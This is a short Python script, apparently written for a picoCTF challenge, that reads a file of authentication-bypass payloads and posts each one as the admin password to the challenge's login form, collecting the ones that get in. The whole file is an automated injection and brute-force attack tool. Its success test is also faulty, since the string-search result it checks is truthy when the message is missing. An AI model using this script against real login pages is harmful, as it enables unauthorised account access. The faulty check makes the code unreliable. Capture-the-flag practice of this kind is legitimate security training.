import requests

workingPayloads = []
with open('auth_bypass_2.txt','r') as payload:
    for line in payload:
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        #print(line)
        #postRequest = f'user={line}&pass={line}'
        postRequest = f'user=admin&pass={line}'
        r = requests.post('http://mercury.picoctf.net:25395/', data=postRequest, verify=False, headers=headers)
        print("payload: ", line)
        if r.text.find("Invalid Login."):
            print("Invalid Login")
        else:
            print("Bingo!!!", line)
            workingPayloads.append(line)
            print(len(workingPayloads))
        # if 200 == r.status_code:
        #     workingPayloads.append(line)
        #     print(len(workingPayloads))
print("These payloads worked!")
for l in workingPayloads:
    print(l)
